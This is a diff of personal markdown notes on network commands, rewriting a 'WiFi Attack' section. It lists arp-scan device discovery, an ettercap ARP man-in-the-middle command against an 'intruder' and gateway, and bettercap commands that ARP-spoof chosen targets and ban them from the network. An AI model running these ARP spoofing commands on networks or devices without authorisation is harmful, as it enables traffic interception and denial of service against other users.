@@ -11,22 +11,36 @@ See script [ipscan.sh](/scripts/ipscan.sh)
 After exec, check **ipscan_result.txt** file
 
 ## WiFi Attack
+### For Kali
 - Requirements:
-```
-sudo apt install arp-scan -y
-sudo apt install dsniff -y
-```
+    ```
+    sudo apt install arp-scan -y
+    sudo apt install dsniff -y
+    ```
 - Show all devices connected
-```
-sudo arp-scan -I [eth0] --localnet
-```
+    ```
+    sudo arp-scan -I [eth0] --localnet
+    ```
 
-For mac
-```
-brew install ettercap
-sudo ettercap -T -q -i [interfaz] -M arp:remote /[IP_intruder]/ /[IP_gateway]/
-```
+### For mac
+- Install
+    ```
+    brew install bettercap
+    brew install --cask wireshark
+    ```
+- Setup attack
+    ```
+    sudo bettercap -iface [eth0]
 
+    set arp.spoof.targets [192.168.x.x, 192.168.x.x]
+    arp.ban
+    ```
+- Set turn off
+    ```
+    arp.ban off
+    Ctrl +c 
+    ```
+    
 ## Other commands
 - Info de IP/dominio    
 `https://centralops.net/`   
